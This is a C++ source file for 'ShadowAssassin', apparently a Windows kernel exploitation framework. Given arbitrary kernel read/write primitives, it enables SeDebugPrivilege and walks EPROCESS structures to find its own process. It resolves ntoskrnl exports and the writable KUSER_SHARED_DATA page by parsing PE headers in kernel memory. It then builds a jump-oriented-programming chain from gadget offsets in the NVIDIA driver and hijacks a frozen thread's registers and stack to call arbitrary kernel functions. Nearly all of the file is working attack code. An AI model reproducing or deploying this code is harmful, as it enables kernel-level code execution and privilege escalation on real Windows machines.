#include "shadowassassin.h"
#include "offsets.h"


// --- Setup ---

ShadowAssassin::ShadowAssassin()
    : scratchAddress(0)
{}

void ShadowAssassin::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn)  { readFn  = fn; }
void ShadowAssassin::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn)          { writeFn = fn; }
void ShadowAssassin::SetScratchAddress(UINT64 addr)     { scratchAddress  = addr;   }


UINT64 ShadowAssassin::Get_System_EPROCESS() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    //getting ntobase
    UINT64 ntobase = 0;
    LPVOID drivers[1024];
    DWORD filler;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &filler)) {
        ntobase = reinterpret_cast<uint64_t>(drivers[0]);
    }
    else {
        DbgLog("need to run as admin.\n");
    }

    UINT64 ps_system_pointer = ntobase + OFF_PS_INITIAL_SYSTEM_PROCESS;
    UINT64 result;

    readFn(&result, ps_system_pointer, 0x8);
    DbgLog("Found EPROCESS struct using sedbg at %llx\n\n", result);
    return result;
}


void ShadowAssassin::SetEPROCESS(UINT64 ep) {
    EPROCESS = ep;
}

FrameManager& ShadowAssassin::GetFrameManager() { return frameManager; }
JOPManager&   ShadowAssassin::GetJOPManager()   { return jopManager;   }


bool ShadowAssassin::Initialize() {
    if (!readFn || !writeFn) {
        DbgLog("[ShadowAssassin::Initialize] FAIL: readFn=%d writeFn=%d\n",
            (bool)readFn, (bool)writeFn);
        return false;
    }

    if (!EPROCESS) {
        DbgLog("[ShadowAssassin::Initialize] FAIL: EPROCESS not set\n");
        return false;
    }

    frameManager.SetReadPrimitive(readFn);
    frameManager.SetWritePrimitive(writeFn);

    jopManager.SetWritePrimitive(writeFn);
    jopManager.SetNvidiaBase(nvidia_base);

    UINT64 dataSectionRva = GetSectionRva(".data");
    if (!dataSectionRva) {
        DbgLog("[Initialize] FAIL: could not resolve .data section\n");
        return false;
    }
    UINT64 scratch = ntso_base + dataSectionRva + 0x80000;
    DbgLog("[Initialize] JOP scratch=0x%llX (ntso .data RVA=0x%llX + 0x80000)\n",
        scratch, dataSectionRva);
    jopManager.SetScratchBase(scratch);

    UINT64 currentEPROCESS = GetCurrentEPROCESS(EPROCESS);

	if (!currentEPROCESS) {
		DbgLog("[ShadowAssassin::Initialize] FAIL: GetCurrentEPROCESS returned 0\n");
		return false;
	}
	DbgLog("[ShadowAssassin::Initialize] Current EPROCESS=0x%llX\n", currentEPROCESS);


	frameManager.SetEPROCESS(currentEPROCESS);

    nvidia_base = GetModuleBaseAddress("nvlddmkm.sys");
    ntso_base = GetModuleBaseAddress("ntoskrnl.exe");

    DbgLog("[CallSyscall] nvidia base: %llx. ntso base: %llx\n", nvidia_base, ntso_base);

    if (nvidia_base == 0) {
        DbgLog("[CallSyscall] Nvidia Driver not loaded! Load it! Press enter to continue anyways or cntrl c to stop.\n ");
        getchar();
    }

	jopManager.SetNvidiaBase(nvidia_base);

    DbgLog("[ShadowAssassin::Initialize] OK: primitives wired\n");
    return true;
}


// --- Kernel export resolution ---

UINT64 ShadowAssassin::GetSectionRva(const char* sectionName) {
    UINT64 e_lfanew = 0;
    readFn((UINT64*)&e_lfanew, ntso_base + 0x3C, sizeof(ULONG));
    e_lfanew &= 0xFFFFFFFF;

    UINT64 numSections = 0;
    readFn((UINT64*)&numSections, ntso_base + e_lfanew + 0x6, sizeof(USHORT));
    numSections &= 0xFFFF;

    UINT64 optHeaderSize = 0;
    readFn((UINT64*)&optHeaderSize, ntso_base + e_lfanew + 0x14, sizeof(USHORT));
    optHeaderSize &= 0xFFFF;

    UINT64 sectionBase = ntso_base + e_lfanew + 0x18 + optHeaderSize;

    for (UINT64 i = 0; i < numSections && i < 32; i++) {
        UINT64 secAddr = sectionBase + i * 0x28;

        char name[9] = {};
        for (int c = 0; c < 8; c++) {
            UINT64 ch = 0;
            readFn((UINT64*)&ch, secAddr + c, 1);
            name[c] = (char)(ch & 0xFF);
        }

        if (strcmp(name, sectionName) == 0) {
            UINT64 rva = 0;
            readFn((UINT64*)&rva, secAddr + 0x0C, sizeof(ULONG));
            rva &= 0xFFFFFFFF;
            DbgLog("[GetSectionRva] %s -> RVA=0x%llX\n", sectionName, rva);
            return rva;
        }
    }

    DbgLog("[GetSectionRva] FAIL: section '%s' not found\n", sectionName);
    return 0;
}

UINT64 ShadowAssassin::GetWritableKusd() {
    // On modern Win11, 0xFFFFF78000000000 is read-only.
    // The writable mapping is nt!MmWriteableSharedUserData (or MmWriteableUserSharedData —
    // the blog uses both spellings inconsistently). Try both.
    static const char* candidates[] = {
        "MmWriteableSharedUserData",
        "MmWriteableUserSharedData",
    };

    for (const char* sym : candidates) {
        UINT64 ptrAddr = ResolveKernelExport(sym);
        if (!ptrAddr) continue;

        UINT64 writableKusd = 0;
        readFn(&writableKusd, ptrAddr, sizeof(UINT64));

        if (!writableKusd || writableKusd == 0xFFFFF78000000000ULL) {
            DbgLog("[GetWritableKusd] %s resolved but value=0x%llX is invalid\n", sym, writableKusd);
            continue;
        }

        DbgLog("[GetWritableKusd] %s=0x%llX -> writable KUSD=0x%llX\n", sym, ptrAddr, writableKusd);
        return writableKusd;
    }

    // Export not found or value invalid — scan ntoskrnl .data for a pointer
    // that points to a page whose NtBuildNumber matches the static KUSD.
    DbgLog("[GetWritableKusd] Export scan failed, trying data section scan\n");

    UINT64 staticBuildNum = 0;
    readFn(&staticBuildNum, 0xFFFFF78000000260ULL, sizeof(ULONG));
    staticBuildNum &= 0xFFFF;
    DbgLog("[GetWritableKusd] Static KUSD NtBuildNumber=0x%llX\n", staticBuildNum);

    // Read ntoskrnl PE to find .data section bounds
    UINT64 e_lfanew = 0;
    readFn((UINT64*)&e_lfanew, ntso_base + 0x3C, sizeof(ULONG));
    e_lfanew &= 0xFFFFFFFF;

    UINT64 numSections = 0;
    readFn((UINT64*)&numSections, ntso_base + e_lfanew + 0x6, sizeof(USHORT));
    numSections &= 0xFFFF;

    UINT64 sectionBase = ntso_base + e_lfanew + 0x18;
    UINT64 optHeaderSize = 0;
    readFn((UINT64*)&optHeaderSize, ntso_base + e_lfanew + 0x14, sizeof(USHORT));
    optHeaderSize &= 0xFFFF;
    sectionBase += optHeaderSize;

    for (UINT64 s = 0; s < numSections && s < 16; s++) {
        UINT64 secAddr = sectionBase + s * 0x28;
        char name[9] = {};
        for (int c = 0; c < 8; c++) {
            UINT64 ch = 0;
            readFn((UINT64*)&ch, secAddr + c, 1);
            name[c] = (char)(ch & 0xFF);
        }

        // Look in .data section
        if (name[0] != '.' || name[1] != 'd') continue;

        UINT64 rva = 0, size = 0;
        readFn((UINT64*)&rva,  secAddr + 0x0C, sizeof(ULONG));
        readFn((UINT64*)&size, secAddr + 0x10, sizeof(ULONG));
        rva  &= 0xFFFFFFFF;
        size &= 0xFFFFFFFF;

        DbgLog("[GetWritableKusd] Scanning .data: rva=0x%llX size=0x%llX\n", rva, size);
        UINT64 scanStart = ntso_base + rva;
        UINT64 scanEnd   = scanStart + size - sizeof(UINT64);

        for (UINT64 addr = scanStart; addr < scanEnd; addr += sizeof(UINT64)) {
            UINT64 candidate = 0;
            readFn(&candidate, addr, sizeof(UINT64));
            if ((candidate & 0xFFFFF00000000000ULL) != 0xFFFFF00000000000ULL) continue;
            if (candidate == 0xFFFFF78000000000ULL) continue;

            UINT64 buildCheck = 0;
            readFn((UINT64*)&buildCheck, candidate + 0x260, sizeof(ULONG));
            if ((buildCheck & 0xFFFF) == staticBuildNum) {
                DbgLog("[GetWritableKusd] Found writable KUSD via scan: ptr@0x%llX -> 0x%llX\n",
                    addr, candidate);
                return candidate;
            }
        }
        break;
    }

    DbgLog("[GetWritableKusd] FAIL: could not find writable KUSD\n");
    return 0;
}

UINT64 ShadowAssassin::ResolveKernelExport(const std::string& name) {
    if (!ntso_base) {
        DbgLog("[ResolveKernelExport] FAIL: ntso_base not set\n");
        return 0;
    }

    // Read e_lfanew from DOS header
    UINT64 e_lfanew = 0;
    readFn((UINT64*)&e_lfanew, ntso_base + 0x3C, sizeof(ULONG));
    e_lfanew &= 0xFFFFFFFF;

    // Read export directory RVA from PE optional header DataDirectory[0]
    UINT64 exportDirRva = 0;
    readFn((UINT64*)&exportDirRva, ntso_base + e_lfanew + 0x88, sizeof(ULONG));
    exportDirRva &= 0xFFFFFFFF;
    if (!exportDirRva) {
        DbgLog("[ResolveKernelExport] FAIL: no export directory\n");
        return 0;
    }

    UINT64 exportDir = ntso_base + exportDirRva;

    UINT64 numberOfNames = 0;
    readFn((UINT64*)&numberOfNames, exportDir + 0x18, sizeof(ULONG));
    numberOfNames &= 0xFFFFFFFF;

    UINT64 addressOfNamesRva = 0;
    readFn((UINT64*)&addressOfNamesRva, exportDir + 0x20, sizeof(ULONG));
    addressOfNamesRva &= 0xFFFFFFFF;

    UINT64 addressOfFuncsRva = 0;
    readFn((UINT64*)&addressOfFuncsRva, exportDir + 0x1C, sizeof(ULONG));
    addressOfFuncsRva &= 0xFFFFFFFF;

    UINT64 addressOfOrdinalsRva = 0;
    readFn((UINT64*)&addressOfOrdinalsRva, exportDir + 0x24, sizeof(ULONG));
    addressOfOrdinalsRva &= 0xFFFFFFFF;

    UINT64 namesTable    = ntso_base + addressOfNamesRva;
    UINT64 funcsTable    = ntso_base + addressOfFuncsRva;
    UINT64 ordinalTable  = ntso_base + addressOfOrdinalsRva;

    for (UINT64 i = 0; i < numberOfNames; i++) {
        UINT64 nameRva = 0;
        readFn((UINT64*)&nameRva, namesTable + i * sizeof(ULONG), sizeof(ULONG));
        nameRva &= 0xFFFFFFFF;

        // Read up to 64 chars of the export name
        char exportName[64] = {};
        for (int c = 0; c < 63; c++) {
            UINT64 ch = 0;
            readFn((UINT64*)&ch, ntso_base + nameRva + c, 1);
            exportName[c] = (char)(ch & 0xFF);
            if (!exportName[c]) break;
        }

        if (name == exportName) {
            UINT64 ordinal = 0;
            readFn((UINT64*)&ordinal, ordinalTable + i * sizeof(USHORT), sizeof(USHORT));
            ordinal &= 0xFFFF;

            UINT64 funcRva = 0;
            readFn((UINT64*)&funcRva, funcsTable + ordinal * sizeof(ULONG), sizeof(ULONG));
            funcRva &= 0xFFFFFFFF;

            UINT64 result = ntso_base + funcRva;
            DbgLog("[ResolveKernelExport] %s -> 0x%llX\n", name.c_str(), result);
            return result;
        }
    }

    DbgLog("[ResolveKernelExport] FAIL: '%s' not found\n", name.c_str());
    return 0;
}

UINT64 ShadowAssassin::GetCurrentEPROCESS(UINT64 eprocess)
{
    UINT32 pid = GetCurrentProcessId();
	UINT64 currentPid = 0;

	UINT64 firstEPROCESS = eprocess;

	while (true) {
		readFn(&currentPid, (UINT64)(eprocess + OFF_PID), 0x8);
		if (currentPid == pid) 
			return eprocess;

		UINT64 flink = 0;
		readFn(&flink, (UINT64)(eprocess + OFF_EPROCESS_LIST), sizeof(UINT64));
		if (!flink || flink == eprocess + OFF_EPROCESS_LIST || flink == firstEPROCESS) {
			DbgLog("[GetCurrentEPROCESS] FAIL: walked full list, PID=%u not found\n", pid);
			return 0;
		}
		eprocess = flink - OFF_EPROCESS_LIST;
	}

}


// --- Syscall dispatch ---





UINT64 ShadowAssassin::GetModuleBaseAddress(const char* targetName) {
    LPVOID drivers[1024]; DWORD cbNeeded;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        for (int i = 0; i < (cbNeeded / sizeof(drivers[0])); i++) {
            char szDriver[256];
            if (GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver)) && _stricmp(szDriver, targetName) == 0) {
                return (UINT64)drivers[i];
            }
        }
    }
    return 0;
}


UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UINT64>& params) {

    UINT64 funcAddr = ResolveKernelExport(name);
    if (!funcAddr) {
        DbgLog("[CallSyscall] FAIL: ResolveKernelExport returned 0 for '%s'\n", name.c_str());
        return 0;
    }
    DbgLog("[CallSyscall] Resolved '%s' -> 0x%llX\n", name.c_str(), funcAddr);

    frameManager.CreateFrozenThread();

    UINT64 frameBase = frameManager.GetFrameAddress();
    if (!frameBase) {
        DbgLog("[CallSyscall] FAIL: frameBase is 0 after CreateFrozenThread\n");
        return 0;
    }
    DbgLog("[CallSyscall] frameBase=0x%llX\n", frameBase);



    jopManager.Build(0x0078CB9E, 0x006d066a, 0x00671319, 0x0061cbb5);
    jopManager.SetCallTarget(funcAddr);
    jopManager.SetRestoreRip(frameManager.ReadStoredRegister("rip"));
    jopManager.Commit();

	frameManager.WriteRegister("rax", jopManager.GetRax());
	frameManager.WriteRegister("rsi", jopManager.GetRsi());
	frameManager.WriteRegister("rdx", jopManager.GetRdx());

	frameManager.PushStack(frameManager.ReadStoredRegister("rsp"));
	frameManager.PushStack(jopManager.GetPopRdxValue());

    UINT64 current_rip = frameManager.ReadRegister("rip");
    printf("[CallSyscall] Current RIP (set breakpoint here) %llx \n", current_rip);

    Sleep(100);
	__debugbreak();
    frameManager.ContinueThread();
    DbgLog("[CallSyscall] Thread continued, returning funcAddr=0x%llX\n", funcAddr);
    return funcAddr;
}
